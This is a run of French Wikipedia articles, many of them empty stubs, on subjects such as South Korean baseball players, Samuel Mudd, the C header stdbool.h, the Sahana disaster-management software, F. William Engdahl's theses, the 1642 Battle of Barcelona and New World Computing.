Sa compagne, la Kényane Martha Komu, également licenciée au club Clermont Athlétisme et de même entraîneur Jean-François Pontier, s’est distinguée au marathon de Paris en remportant l’épreuve féminine en 2 h 25 min 33 s en 2008. Elle aussi sélectionnée pour les JO de Pékin mais sous le drapeau kényan, elle terminera de l'épreuve avec un chrono de 2 h 27 min 23 s.

</doc>
<doc id="3215492" url="https://fr.wikipedia.org/wiki?curid=3215492" title="Ki-Joo Han">
Ki-Joo Han



</doc>
<doc id="3215493" url="https://fr.wikipedia.org/wiki?curid=3215493" title="La guerre des clones">
La guerre des clones



</doc>
<doc id="3215495" url="https://fr.wikipedia.org/wiki?curid=3215495" title="Hyun-Jin Ryu">
Hyun-Jin Ryu



</doc>
<doc id="3215496" url="https://fr.wikipedia.org/wiki?curid=3215496" title="Dae-Ho Lee">
Dae-Ho Lee



</doc>
<doc id="3215497" url="https://fr.wikipedia.org/wiki?curid=3215497" title="Juan carmona">
Juan carmona



</doc>
<doc id="3215499" url="https://fr.wikipedia.org/wiki?curid=3215499" title="Young-Min Ko">
Young-Min Ko



</doc>
<doc id="3215501" url="https://fr.wikipedia.org/wiki?curid=3215501" title="Tour dorée">
Tour dorée



</doc>
<doc id="3215502" url="https://fr.wikipedia.org/wiki?curid=3215502" title="Lee Taek-keun">
Lee Taek-keun

Lee Taek-Keun (né le à Pusan, Corée du Sud) est un joueur coréen de baseball qui joue avec les Nexen Heroes de Séoul dans la ligue sud-coréenne de baseball.
Il a obtenu la médaille d'or de baseball lors des jeux olympiques 2008 à Pékin.

</doc>
<doc id="3215503" url="https://fr.wikipedia.org/wiki?curid=3215503" title="Samuel Mudd">
Samuel Mudd

Samuel Alexander Mudd ( - , d'une pneumonie) était un médecin du Maryland impliqué et emprisonné pour avoir conspiré et soigné John Wilkes Booth, l'assassin du président Abraham Lincoln. Il sera libéré par le président Andrew Johnson le 1869.
Son affiliation au parti démocrate est un fait connu et admis par tous les historiens. En 1877, il essaiera de se faire élire en tant que candidat démocrate pour la Chambre des délégués de Maryland.
Les faits.
Booth a abattu Lincoln le 14 avril 1865, mais a été blessé lors de son évasion de la scène. Il s’est ensuite rendu avec son complice David Herold chez Mudd aux premières heures du 15 avril pour une intervention chirurgicale sur la jambe fracturée avant de s'enfuir pour la Virginie. Ce jour-là, Mudd a dû apprendre l’assassinat, mais n’a pas signalé la visite de Booth aux autorités avant 24 heures. Ce fait semblait le lier au crime, tout comme les diverses versions de l’histoire lors des interrogatoires. Une commission militaire a déclaré Mudd coupable d’avoir aidé et conspiré dans un meurtre, et il a été condamné à la prison à vie, échappant à la peine de mort d'une seule voix.
Mudd a été emprisonné à Fort Jefferson, dans les Dry Tortugas. À l'automne 1867, il y eut une épidémie de fièvre jaune au fort. Le médecin de la prison est mort et Mudd a accepté de le remplacer. Il a pu aider à endiguer la propagation de la maladie. Il a été gracié par le Président Johnson le 8 février 1869.
Le degré de culpabilité de Samuel Mudd est resté controversé. Les tentatives de réhabilitation notamment de son petit-fils Richard Mudd n'ont pas abouties.

</doc>
<doc id="3215504" url="https://fr.wikipedia.org/wiki?curid=3215504" title="Seung-Hwan Oh">
Seung-Hwan Oh



</doc>
<doc id="3215505" url="https://fr.wikipedia.org/wiki?curid=3215505" title="Stdbool.h">
Stdbool.h

codice_1 est l'en-tête de la bibliothèque standard C consacré aux booléens. Il a été introduit avec la norme C99 et contient quatre macros. 
Macros.
Les macros telles que définies dans l'IEEE Std 1003.1-2001 sont les suivantes :
Les programmes utilisant ces macros peuvent redéfinir codice_2, codice_4 et codice_5. Cette possibilité est en revanche considérée comme obsolète et devrait être retirée dans les versions à venir.
En C++.
Le fichier d'en-tête est également disponible pour les programmes C++, mais il ne définit que la macro dépréciée codice_6 car le standard fournit un véritable type booléen et garantit l'existence des mots clés codice_2, codice_5 et codice_4 correspondant respectivement au type et à ses deux valeurs valides.
C23.
La future version du standard du langage C, C23, prévoit de supprimer les macros codice_2, codice_4 et codice_5 en faveur de mots-clés du même nom et ayant la même sémantique qu'en C++, ainsi que de rendre obsolète la macro codice_6.

</doc>
<doc id="3215506" url="https://fr.wikipedia.org/wiki?curid=3215506" title="Sahana">
Sahana

Sahana est un logiciel libre et open source de gestion des situations d'urgence et de catastrophes, dont le nom veut dire "soulagement" en cingalais.
Créé en 2004 dans le cadre des efforts de sauvetage au Sri Lanka à la suite du séisme de l'océan Indien et du tsunami qui a suivi, il a depuis été déployé pour la coordination de plus d'une vingtaine d'actions de secours de grande ampleur à travers le monde, comme le séisme de Java de mai 2006 ou le typhon Yolanda aux Philippines en 2013. 
Le logiciel est maintenu et développé par la "Sahana Software Foundation", organisation à but non lucratif. Le système peut être téléchargé gratuitement et personnalisé. C'est un logiciel libre distribué selon les termes de la licence GNU LGPL. 
Historique.
Le logiciel a été initialement conçu pour coordonner les secours qui ont suivi la catastrophe du séisme et du tsunami de l'océan Indien du . Il a été mis au point par une communauté de volontaires coordonnés par LSF("Lanka Software Foundation") et déployée au sein du Centre pour les Agences Humanitaires (CHA) du Centre National des Opérations (CNO) du gouvernement du Sri Lanka. 
Vu le succès initial cette application et de la nécessité impérieuse de disposer des solutions de gestion de catastrophes, l'Agence Suédoise du Développement International (ASDI) a financé une seconde phase à travers LSF, dans le but de généraliser l'application à une utilisation globale dans des catastrophes de grande échelle, avec l'appui d'une centaine de volontaires. 
En 2009, LSF a transféré à "Sahana Software Foundation", une organisation à but non lucratif établie en Californie, la propriété intellectuelle, la maintenance et le développement de Sahana. 
Fonctions et caractéristiques.
Sahana est un logiciel collaboratif sous forme de portail web, conçu autour de trois produits. 
Sahana Eden est axé sur la gestion de l'aide humanitaire. Il permet les activités suivantes : 
Sahana Vesuvius est orienté vers la préparation et la réponse aux catastrophes pour la communauté médicale: 
Les anciens produits, dont Krakatoa, le descendant direct de la version de Sahana mises en œuvre en 2004.

</doc>
<doc id="3215509" url="https://fr.wikipedia.org/wiki?curid=3215509" title="Tawassul">
Tawassul



</doc>
<doc id="3215513" url="https://fr.wikipedia.org/wiki?curid=3215513" title="Récepteur 5-HT3">
Récepteur 5-HT3

Le récepteur 5-HT3 est un récepteur ionotrope activé par la sérotonine qui appartient à la famille de récepteur cys-loop, comme le récepteur GABAA, le récepteur à l'acétylcholine et le récepteur à la glycine.
Il est retrouvé dans la région du cerveau nommée CTZ (Chimioreceptive Trigger Zone), dans le plancher du , qui déclenche le réflexe nauséeux. Le canal est spécifiquement inhibé par l'ondansétron qui est un anti émétique utilisé pour éviter l'état nauséeux associé à la thérapie anticancéreuse.

</doc>
<doc id="3215521" url="https://fr.wikipedia.org/wiki?curid=3215521" title="Friedrich Cerha">
Friedrich Cerha

Friedrich Cerha est un compositeur et chef d'orchestre autrichien né le à Vienne et mort le dans la même ville.
Biographie.
Friedrich Cerha a fait ses études à l'Académie de musique de Vienne (violon, composition, direction d'orchestre) et à l'université de Vienne (musique, culture allemande, philosophie). Il est le cofondateur avec Kurt Schwertsik de l'ensemble de musique contemporaine « Die Reihe », qui a été un important instrument pour la diffusion de la musique contemporaine en Autriche. Avec cet ensemble, il a enregistré "Aventures" et "Nouvelles Aventures" (pour trois chanteurs et 7 instrumentistes) de György Ligeti (Candide - Vox Productions, 1975). À côté de son travail de composition, Cerha s'est construit une réputation d'interprète des œuvres d'Alban Berg, Arnold Schoenberg et Anton Webern; son affinité pour les œuvres de la seconde école de Vienne culmine en 1979 avec l'opéra "Lulu" d'Alban Berg dont il termine l'orchestration du et dont il comble certaines lacunes de la partition. Pierre Boulez a créé à Paris en 1979 cette version de l'opéra.
En , Friedrich Cerha a rejoint la Société Joseph Marx. Avec un groupe de compositeurs contemporains tels que Kurt Schwertsik et Peter Vujica, il s'est engagé pour la création de cette société. Ce choix du nom de Joseph Marx, qui a été un important compositeur de musique tonale en Autriche, ainsi qu'un enseignant et un critique, souligne que Cerha est un artiste sans dogmatisme qui soutient la redécouverte de toute musique importante en dehors de toute référence à la tonalité ou au modernisme.
Friedrich Cerha continue de composer des œuvres pour l'orchestre et pour la scène (entre autres, "Baal", "The Rattenfänger", et "Der Riese vom Steinfeld", ce dernier commandé par le Wiener Staatsoper, sur un livret de Peter Turrini). Des créations de quelques-unes des œuvres récentes ont eu lieu en (par exemple "Impulse" pour grand orchestre, dédié à l'Orchestre philharmonique de Vienne à l'occasion de son ) ainsi qu'en (Concerto pour Saxophone, Soprano et Orchestre, écrit en 2004).
Parmi les étudiants de Cerha, on trouve Petr Kotik, Georg Friedrich Haas, Gerald Barry, Benet Casablancas et Karlheinz Essl.

</doc>
<doc id="3215527" url="https://fr.wikipedia.org/wiki?curid=3215527" title="F. William Engdahl">
F. William Engdahl

Frederick William Engdahl (né en 1944 à Minneapolis, dans le Minnesota) est un économiste, écrivain et journaliste américain qui s'exprime sur des sujets de géopolitique, d'économie et d'énergie depuis plus de trois décennies.
Il collabore régulièrement à un certain nombre de publications dont "Nihon Keizai Shimbun", "", "Grant's Investor.com", "European Banker" et "Business Banker International" et la revue italienne des études de géopolitique "Eurasia". Il a participé à de nombreuses conférences internationales concernant la géopolitique, l'économie et l'énergie, et exerce une activité de conseil économique. Il a été pendant longtemps collaborateur du Mouvement LaRouche et a publié de nombreux articles pour ses média.
Biographie.
Après avoir obtenu un diplôme en sciences politiques de l'Université de Princeton et passé une thèse en économie comparée à l'Université de Stockholm, il travaille comme économiste et journaliste indépendant à New York et en Europe, abordant comme sujets l'effondrement de l'Union soviétique, la crise économique asiatique, l'Accord général sur les tarifs douaniers et le commerce (le GATT pour reprendre le sigle anglais), les négociations commerciales du cycle de l'Uruguay, les politiques alimentaires de l'Union européenne, la politique du Fonds monétaire international, la question de la dette du Tiers monde, les fonds de couverture, et le rôle politique du commerce des dérivés.
L'auteur collabore régulièrement à un certain nombre de publications dont "Asia Times Online", "Asia Inc.", "Nihon Keizai Shimbun" (Japon), la revue "Foresight", les journaux "Freitan" (Allemagne) et "ZeitFragen" (Suisse), "Grant's Investor.com", "European Banker" et "Business Banker International". Il écrit souvent pour le Centre de recherche sur la mondialisation (en anglais Center for Research on Globalization), FinancialSense.com et 321Gold.com, entre autres sites web.
Il a participé à de nombreuses conférences internationales sur des sujets traitant de géopolitique, d'économie, d'organismes génétiquement modifiés, d'approvisionnement énergétique : Montreaux Global Investors' Forum, Centre for Energy Policy Studies (Londres), la banque Negara Indonesia (Jakarta), la Chambre internationale de Commerce (Zagreb) et l'Institut international des études stratégiques (Moscou).
Il habite actuellement en Allemagne où il exerce des activités de conseil en matière de risque géopolitique et enseigne dans la Section économique de l'Université des sciences appliquées de Wiesbaden.
Ouvrages.
Économiste et écrivain, F. William Engdahl est l'auteur de succès de librairie sur le pétrole et la géopolitique : "A Century of War: Anglo-American Oil Politics and the New World Order" (1993), ouvrage traduit en français sous le titre « Pétrole, une guerre d'un siècle : l'ordre mondial anglo-américain », en arabe, coréen, allemand, croate et turc, "Seeds of Destruction : The Hidden Agenda of GMO" (2007).
Depuis plus de trente ans, il écrit sur des questions de politique, d'économie, de géopolitique, d'énergie, d'agriculture, sur l'Organisation mondiale du commerce et sur le Fonds monétaire international, ses premiers travaux remontant au premier choc pétrolier et à la crise céréalière mondiale du début des années 1970.
"Pétrole : une guerre d'un siècle" (2004).
Dans ce livre, intitulé dans sa version originale "A Century of War: Anglo-American Oil Politics and the New World Order", l'auteur retrace l'histoire de l'emprise exercée par l'industrie pétrolière sur l'économie du monde depuis la période suivant la mondiale jusqu'à nos jours.
Il développe la thèse que la géopolitique du pétrole est à l'origine de l'effondrement de l'Union soviétique, de l'éclatement de la Yougoslavie et de l'ascension et la chute des Talibans.
Il révèle, documents à l'appui, que la décision des États-Unis et du Royaume-Uni d'entrer en guerre contre l'Irak est une initiative stratégique pour contrôler l'économie mondiale pour les cinq décennies à venir. Il aborde le rôle de Zbigniew Brzezinski et George Ball dans l'exploitation du modèle de balkanisation islamique mis en avant par Bernard Lewis ; il y dévoile également le rôle des États-Unis dans le renversement en 1979 du Shah d'Iran en vue de moduler le prix du pétrole et d'arrêter l'expansion soviétique.
"Seeds of Destruction. The Hidden Agenda of Genetic Manipulation".
Cet ouvrage traite des soutiens et des investisseurs de la brevetabilité du vivant. Il vise à démontrer qu'une fraction de l'élite socio-politique américaine cherche à contrôler la base même de la survie de l'homme : la production de « notre pain quotidien ». Selon Engdahl, « contrôlez l'alimentation et vous contrôlez les gens ». Allant au-delà de la critique des manipulations génétiques en tant que technique scientifique, l'auteur décrit un monde où la manipulation génétique et le brevetage des formes de vie servent à contrôler la production alimentaire.
"Full Spectrum Dominance: Totalitarian Democracy in the New World Order".
Ce titre désigne la mainmise absolue sur la planète que cherche à obtenir la faction américaine à la tête du ministère de la Défense, des industries militaire et pétrolière, et ce en créant un réseau planétaire de bases militaires et en suscitant des conflits. Pour changer les régimes, on fait appel à la propagande, aux révolutions de couleur et à tout un arsenal de techniques de guerre psychologique et économique.
Thèses de l'auteur.
Sur le pic pétrolier.
L'auteur insiste sur le fait qu'il existe deux théories en présence concernant l'origine du pétrole :
Selon la première explication, la quantité de pétrole serait donc finie et l'humanité aurait dépassé le sommet (le « pic pétrolier ») d'une courbe en forme de cloche. Selon la deuxième, il n'y a pas de pic pétrolier et il suffit de forer très profondément pour trouver du pétrole. Cette théorie aurait été validée dans les années 1960 par la découverte d'immenses gisements dans le bassin prétendument stérile du Dnieper-Donets et plus récemment au large des côtes du Viêt Nam.
Prenant conscience de l'importance stratégique du savoir-faire des géologues russes, les États-Unis auraient cherché à en bénéficier mais leur demande officielle a été rejetée et leur tentative d'acquérir des participations dans l'entreprise pétrolière Ioukos contrecarrée.
En prévision du tarissement des gisements de l'Arabie séoudite, du Koweït et du Nigeria qu'ils contrôlent, les États-Unis chercheraient à s'emparer des grands gisements d'Irak et d'Iran tout en entourant la Russie de bases militaires et de sites antimissiles permettant de couper les liens portuaires et les oléoducs alimentant l'Europe de l'Ouest, la Chine et le reste de l'Asie.
Sur le réchauffement planétaire.
Engdhahl soutient la thèse selon laquelle la publicité faite par les gouvernements et les médias occidentaux au réchauffement planétaire, se heurterait au constat que l'hiver très rigoureux qu'a connu l'hémisphère nord en 2008 a vu la reformation des glaces de l'Arctique.
La campagne médiatique autour du prétendu réchauffement planétaire aurait selon lui été mise sur pied par les élites dirigeantes anglo-américaines pour régenter l'économie mondiale et réduire la croissance démographique. Ces élites seraient toutefois divisées sur la façon d'atteindre ces buts. Une faction serait pour la manière forte (contrôle de l'approvisionnement énergétique par la force militaire), l'autre faction privilégierait le recours aux instances internationales.
Sur la guerre en Afghanistan.
Engdahl développe la thèse que l'armée américaine est en Afghanistan moins pour éliminer l'organisation Al-Qaïda – dont « la présence est très réduite » – que pour deux raisons passées sous silence :
Sur l'ingénierie génétique.
En 2009, il apparait dans le documentaire "The Idiot Cycle" (), où il affirme que la Fondation Rockefeller est à l'origine des premières bourses de recherche sur la modification génétique de semences nécessaires à l'alimentation humaine et animale. Il pointe aussi du doigt le pouvoir donné par la production et le brevetage de semences essentielles aux grandes sociétés de l'industrie agroalimentaire (Monsanto, Syngenta et deux autres).
Sur les autres géopolitologues.
Ayant collaboré quelques années avec Lyndon Larouche, il s'est éloigné de lui par la suite : « tout d'abord, je n'entretiens aucun lien avec M. Larouche et cela depuis des années. Je ne suis pas un fasciste, un antisémite, un néo-nazi, ni un adepte de droite de la théorie du complot, contrairement à ce que laissent entendre certaines accusations lancées sur l'internet. (...) Je demande seulement à être jugé en fonction de ce que je dis et non de qui j'ai fréquenté autrefois ».

</doc>
<doc id="3215529" url="https://fr.wikipedia.org/wiki?curid=3215529" title="Riku Sanjo">
Riku Sanjo



</doc>
<doc id="3215532" url="https://fr.wikipedia.org/wiki?curid=3215532" title="Harageh">
Harageh

Harageh (ou encore el-Harageh ou Haraga) est un village d'Égypte, à l'entrée du Fayoum, à proximité d'El-Lahoun, où ont été trouvées des nécropoles de l'Égypte antique.
Nécropoles.
Les tombes appartiennent aux époques de Nagada (vers -3500), de la Première Période intermédiaire (vers -2150), du Moyen Empire tardif (vers -1800), du Nouvel Empire et à d'autres époques ultérieures. Elles ont été fouillées en 1913 et 1914 par Reginald Engelbach.
Découvertes.
Les cimetières du Moyen Empire sont considérés comme les mieux fouillés et publiés de l'époque. Les défunts sont le plus souvent déposés dans des tombes à puits pourvues de chambres funéraires souterraines, les superstructures ayant disparu.
Les fouilles ont révélé des statues, des stèles et des sarcophages, dont certains, inviolés, contenaient des bijoux. Quelques fragments de papyrus ont été découverts, dont un contant l'histoire de Sinouhé.

</doc>
<doc id="3215536" url="https://fr.wikipedia.org/wiki?curid=3215536" title="Patriarcat de Serbie">
Patriarcat de Serbie



</doc>
<doc id="3215544" url="https://fr.wikipedia.org/wiki?curid=3215544" title="Bataille de Barcelone">
Bataille de Barcelone

La bataille de Barcelone se déroule du 29 juin au 3 juillet 1642 pendant la guerre franco-espagnole de 1635-1659. C'est la sixième grande bataille navale opposant les deux pays après les combats de Guetaria (1638), sur la côte basque, de Vado (1638), au large de Gênes, de Cadix (contre un gros convoi, 1640), de Rosas (entre Barcelone et Port-Vendres), et de Tarragone (1641).
Trois jours de combats.
En 1642, une grande flotte quitta Cadix sous les ordres de Juan Alonso Idiaquez en direction de la Catalogne. Elle était composée de 31 galions, 2 frégates, 3 pataches, 6 brûlots, 6 navires avec la logistique et 35 "barcos longos", de grandes chaloupes à rames, auxiliaires des galions pour les remorquer faute de vent, dévier les brûlots, etc. L'amiral espagnol disposait au total de 64 navires et 22 galères. Il y avait aussi un convoi de navires chargés de vivres. À cette flotte vient se joindre une escadre de Dunkerque formée de 5 galions et une frégate, ainsi que 8 galères en un premier temps et deux autres un peu plus tard.
Dans le détroit de Gibraltar, ils capturèrent 3 navires hollandais avec un riche chargement d'Orient. En plusieurs escales, ils complétèrent les équipages, arrivant le 29 juin à Barcelone, où ils aperçurent la flotte française de Maillé-Brezé qui bloquait la ville. Maillé-Brézé était passé en Méditerranée avec 20 vaisseaux armés à Brest pour joindre ses forces à l’escadre de Toulon, afin de bloquer par mer Perpignan, déjà assiégée par voie de terre. Maillé-Brézé disposait, après la jonction des deux escadres, de 44 vaisseaux, 17 galères et 13 brûlots.
Le combat s'engagea aussitôt. Mais, il y avait beaucoup de vent, et les galères espagnoles s'étaient séparées. La flotte était donc formée par 36 galions, 3 frégates, 3 pataches, 6 brûlots et les "barcos longos" et 10 galères a proximité. Malgré la nette infériorité, le mauvais état de la mer, le fait qu'il soit déjà 3 heures de l'après-midi et en raison des ordres stricts du comte d'Olivares, les Espagnols n'hésitèrent pas à attaquer, la canonnade se prolongeant jusqu'au coucher du soleil. Le galion "Testa de Oro" en sortit très malmené, mais put se replier vers les forces espagnoles. Les Espagnols cherchaient systématiquement l'abordage, et les Français l'évitaient par tous les moyens. Ils lancèrent 1 brûlot contre 3 pour les Espagnols mais tous sans résultat. Néanmoins, pendant la nuit, et après une collision nocturne, le galion espagnol "Santo Tomás", ingouvernable, se retrouva entre les forces françaises et capitula au petit matin.
Le jour suivant, le combat reprit avec acharnement une fois les galères espagnoles à nouveau incorporées à la flotte. Elle parvint à couper la ligne française par ses trois derniers navires et à aborder le , un puissant vaisseau de 48 canons, par le galion espagnol "Magdalena" de 34 canons, créant autour des deux navires un regroupement de navires venus secourir les siens. Les Français lancèrent alors un brûlot contre le vaisseau amiral espagnol. Celui-ci réussit à le dévier, faisant impact sur le "Guise". Tous les navires s'éloignèrent, excepté les deux navires empêtrés, qui furent dévorés par les flammes, avec la quasi-totalité des équipages français et espagnol. Le comte Tyrconnel, mestre de camp irlandais, et un capitaine de la même nation périrent pendant le désastre.
Le 3 juillet, la bataille reprit avec vigueur, les Espagnols essayant toujours de parvenir à l'abordage, les Français l'évitant. Le combat tourna au duel d'artillerie, ce qui donna finalement la victoire aux Français : 15 vaisseaux espagnols étaient hors de combat, et les autres forcés à la fuite malgré le ravitaillement réussi de Rosas. Cette victoire coûta 4 navires à Maillé-Brézé, dont 3 brulots. Par contre, il captura un galion espagnol. Les Espagnols eurent 2 navires perdus, l'un coulé et l'autre capturé par les Français, et 2 brûlots aussi perdus. Le combat précipita la chute de Perpignan et la conquête du Roussillon. Il ne fut pas le dernier, la guerre franco-espagnole étant un affrontement de longue haleine. Dès l'année suivante, Maillé-Brézé reparut dans les eaux espagnoles pour livrer bataille et y remporter une nouvelle victoire au cap Gate, près de Carthagène.
Rendre compte de ce combat n'est pas facile, car il s'agit d'une mêlée générale typique des batailles navales de cette époque. Les vaisseaux et galions cherchent le duel au canon ou à l'abordage, tandis que les galères tentent de prendre de flanc l'adversaire en ouvrant le feu au dernier moment par leur artillerie de proue installée dans le sens de la marche. La tactique de la ligne de file, caractéristique des combats navals d'après 1650, n'avait pas encore été théorisée, ce qui ne sera fait qu'à l'issue de la guerre civile anglaise (1642-1648) et des premiers affrontements entre la "Royal Navy" et la flotte hollandaise.

</doc>
<doc id="3215545" url="https://fr.wikipedia.org/wiki?curid=3215545" title="Wong Fei-Hong">
Wong Fei-Hong



</doc>
<doc id="3215548" url="https://fr.wikipedia.org/wiki?curid=3215548" title="Germaine Van Dievoet">
Germaine Van Dievoet

Germaine Van Dievoet, est une sportive belge, championne de natation, membre de la "Fédération Royale Belge de Natation et de Sauvetage", née à Bruxelles le et décédée à l'âge de 91 ans le à Uccle, clinique des Deux Alices.
Elle est la fille de l'architecte Henri Van Dievoet (1869-1931).
Biographie.
Germaine Van Dievoet fut une des dix seules jeunes-filles belges à avoir participé aux Jeux olympiques d'été de 1920, célébrés à Anvers, en Belgique du au .
Elle participa en 1922 aux jeux athlétiques féminins de Monte-Carlo et remporte la troisième place du 100 m. nage libre.
Germaine Van Dievoet fut championne de Belgique des 100 m. nage libre pour dames en 1920, 1921, 1922 et 1923.
Elle reçut la médaille de bronze du Mérite Sportif le jeudi .
Le quotidien sportif français "l'Auto" la qualifie de "célèbre" et la décrit comme une "extraordinaire et populaire championne".
Vie privée.
Germaine Van Dievoet épousa à Uccle le , Willy Dessecker, né le et décédé à Uccle (Clinique des deux Alices) le . Ils n'eurent pas d'enfants.

</doc>
<doc id="3215549" url="https://fr.wikipedia.org/wiki?curid=3215549" title="Ghibli (vent)">
Ghibli (vent)



</doc>
<doc id="3215551" url="https://fr.wikipedia.org/wiki?curid=3215551" title="Phara Anacharsis">
Phara Anacharsis

Phara Anacharsis (née le à Fort-de-France) est une athlète française, spécialiste du 400 mètres haies.
Biographie.
Elle se révèle en 2005 à 21 ans quand elle remporte le titre national en salle sur 400 m.
En 2006, elle participe aux Championnats d'Europe à Göteborg où elle est éliminée en séries. En , elle est sélectionnée en équipe de France aux Championnats du monde d'athlétisme 2007.Membre du relais 4 × 400 m féminin, elle termine avec ces coéquipières Solen Désert, Virginie Michanol et Thélia Sigère à la deuxième place de la Coupe d'Europe 2008, derrière les Russes, futures vice-championnes olympiques. Pendant la course, elles ont dominé les relais ukrainien, polonais et britannique (ce dernier comptait pourtant dans ses rangs la championne du monde 2007 Christine Ohuruogu et l'heptathlonienne Kelly Sotherton). Quelques semaines plus tard, à Pékin aux Jeux olympiques, le relais est éliminé en série (il se classe cinquième), dans un temps similaire à celui de la Coupe d'Europe.
Le , l'athlète martiniquaise décroche la médaille d'argent du relais 4 × 400 mètres avec ses partenaires Lenora Guion Firmin, Marie Gayot et Floria Guei lors des championnats d'Europe à Helsinki. L'équipe de France, qui établit le temps de , est devancée par l'Ukraine.
Après quelques années ponctuées par les blessures, Phara Anacharsis bat le lors du Meeting de Montreuil son record personnel sur 400 m haies en 55 s 84 et se qualifie ainsi pour les Jeux olympiques de Rio.
Le , lors des Championnats d'Europe d'Amsterdam, la Française est éliminée en demi-finale du 400 m haies (57 s 05) mais contribue à la médaille d'argent du relais lors de la finale (3 min 25 s 96), sa continentale.
Le , à Prague, elle court en 56 s 45.
Vie privée.
Phara Anacharsis est apparue dans le documentaire "Complément d'enquête" en où elle révèle travailler dans le magasin Decathlon pour pouvoir vivre et dit même se « retrouver avec rien dans le frigo en fin de mois ».

</doc>
<doc id="3215554" url="https://fr.wikipedia.org/wiki?curid=3215554" title="Avia C.2">
Avia C.2



</doc>
<doc id="3215555" url="https://fr.wikipedia.org/wiki?curid=3215555" title="Trafic à Saïgon">
Trafic à Saïgon

Trafic à Saïgon (titre original : "Saigon") est un film d'aventure américain réalisé par Leslie Fenton, sorti en 1948.
Synopsis.
Alors que la Seconde Guerre mondiale est terminée, deux amis de l’armée, dont l’un n'a plus que quelques mois à vivre à cause d'une blessure à la tête, décident de partir à l'aventures dans l' Asie du Sud-Est où ils feront la connaissance d'un criminel notoire ainsi que de sa jeune secrétaire.

</doc>
<doc id="3215556" url="https://fr.wikipedia.org/wiki?curid=3215556" title="New World Computing">
New World Computing

 était une société américaine de développement et d'édition de jeux vidéo, fondée en 1984 par Jon Van Caneghem et Mark Caldwell. La société était plus connue pour son travail sur la série ' et ses spin-offs, plus spécialement '. La compagnie fut achetée par en 1996. En 2003, avec la faillite de 3DO, disparut aussi. Ubisoft acheta les droits sur la série " en 2003.
 est fondé en 1984 par Jon Van Caneghem, Michaela et Mark Caldwell afin d’éditer "", conçu et programmé par Jon. Le jeu est publié en 1986 sur Apple II avant d’être porté sur Commodore 64, Mac OS et MS-DOS un an plus tard. Le jeu est bien accueilli par les critiques de l’époque qui le compare positivement avec les jeux vidéo de rôle contemporain, ce qui permet à ses développeurs d’en publier une suite, ", en 1988 sur Apple II et MS-DOS.
En 1992, publia son premier jeu exclusivement sur PC, '. Avec ' et ", sortis sur PC respectivement en 1992 et 1993, réalisa quelque chose qui était (et resta à ce jour) inédit : si un joueur avait installé les deux jeux sur le même disque dur, il pouvait se déplacer dans les deux mondes à la fois, et pouvait en fait avoir accès à des parties du monde qui n'étaient pas disponibles si l'on jouait séparément à chaque jeu. Une série précédente, , avait tenté de faire ceci quelques années auparavant, mais le concept avait échoué en partie à cause du format disquette des systèmes de l'époque.
En 1996, est racheté par qui continue de publier de nouveaux " jusqu'en 2002 et en 2003, la franchise est rachetée par Ubisoft.
Après une pause de cinq ans, New World revint à la série des ' avec ', leur premier RPG avec des graphismes 3D. ', ' et " suivirent entre 1999 et 2002.
En 1995, 1996, et 1999, New World sortit ', ', et ". Le quatrième jeu suivit en 2002. New World développa aussi une version PlayStation 2, qui était un remake 3D d'un de leurs anciens jeux, "King's Bounty".
Autres jeux.
En 1989, New World Computing développa le jeu satirique ', basé sur le jeu de cartes du même nom de Flying Buffalo. Même si ce jeu ne rencontra pas un grand succès commercial, il était notable en tant que différant d'autres RPG. En 1990, la compagnie sortit "King's Bounty" sur Apple II et le jeu fut adapté plus tard sur Megadrive. Ce jeu est notable en tant que précurseur de la série des '.

</doc>
<doc id="3215558" url="https://fr.wikipedia.org/wiki?curid=3215558" title="Lee Jong-wook (baseball)">
Lee Jong-wook (baseball)

Lee Jong-wook (né le à Séoul en Corée du Sud) est un joueur coréen de baseball qui joue avec les NC Dinos de Changwon dans la ligue sud-coréenne de baseball.
Il a obtenu la médaille d'or de baseball lors des Jeux olympiques 2008 à Pékin.

</doc>
<doc id="3215560" url="https://fr.wikipedia.org/wiki?curid=3215560" title="Palais omnisports de Moscou">
Palais omnisports de Moscou



</doc>
<doc id="3215564" url="https://fr.wikipedia.org/wiki?curid=3215564" title="Phara Anarchasis">
Phara Anarchasis



</doc>
<doc id="3215575" url="https://fr.wikipedia.org/wiki?curid=3215575" title="Peur bleue (film, 1985)">
Peur bleue (film, 1985)

Peur bleue ("") est un film d'horreur américain réalisé par Daniel Attias, sorti en 1985. Il s'agit de l'adaptation du roman "L'Année du loup-garou" de Stephen King, qui écrit lui-même le scénario.
Synopsis.
Vers la fin du siècle dans la petite ville de Tarker's Mill (Maine), vit la famille Coslaw. Jane, la fille aînée, a des rapports difficiles avec son jeune frère Marty qui est paraplégique. Depuis quelque temps, des meurtres sanglants ont lieu dans les environs à chaque pleine lune : un travailleur des chemins de fer, une jeune femme, un vieux jardinier alcoolique et un adolescent ami de Marty. Celui-ci soupçonne un loup-garou d'en être la cause. Ayant assez de tous ces meurtres, une quarantaine d'hommes venant de la taverne décident alors de partir à la chasse au monstre une nuit de pleine lune dans la forêt. Plusieurs d'entre eux trouveront la mort cette nuit-là mais le monstre ne sera pas tué. Les soupçons de l'enfant deviennent une certitude lorsqu'il aperçoit le monstre un soir de pleine lune. Il s'en tire de justesse en lançant une fusée d'artifice en plein visage du loup-garou, lui crevant l’œil.
Marty demande alors à sa sœur Jane de l'aider à retrouver le monstre sous sa forme humaine avant la prochaine pleine lune. Plutôt sceptique, Jane accepte de lui venir en aide. Elle s'aperçoit bientôt qu'une personnalité importante de Tarkers' Mill est devenue borgne ! Les enfants demandent alors l'aide à leur oncle Red, un homme dépravé mais attentionné, et lui donnent chacun leur chaîne afin d'en faire une balle d'argent.
Production.
Tournage.
Pour un budget d'environ , le tournage a lieu à Burgaw et à Wilmington en Caroline du Nord, d'octobre à .
Effets spéciaux.
Après son travail remarquable pour les films à succès "King Kong" de John Guillermin (1976), "Alien - Le huitième passager" de Ridley Scott (1979) et "E.T. l'extra-terrestre" de Steven Spielberg (1982), Carlo Rambaldi signe ici un contrat pour les effets spéciaux.
Accueil.
Sorties et festival.
Ce film sort le aux États-Unis.
En France, il est projeté en avant-première, le , au festival international du film fantastique d'Avoriaz 1986, avant sa sortie nationale ayant lieu deux jours plus tard.
Critiques.
Sur le site agrégateur de critiques , il reçoit un accueil critique assez mitigé, recueillant 50 % de critiques positives, avec une note moyenne de et sur la base de .
Le film a connu un succès commercial modéré, rapportant environ au box-office en Amérique du Nord pour un budget de .
En France, le film totalise .

</doc>
<doc id="3215577" url="https://fr.wikipedia.org/wiki?curid=3215577" title="The Way of All Flesh (album)">
The Way of All Flesh (album)

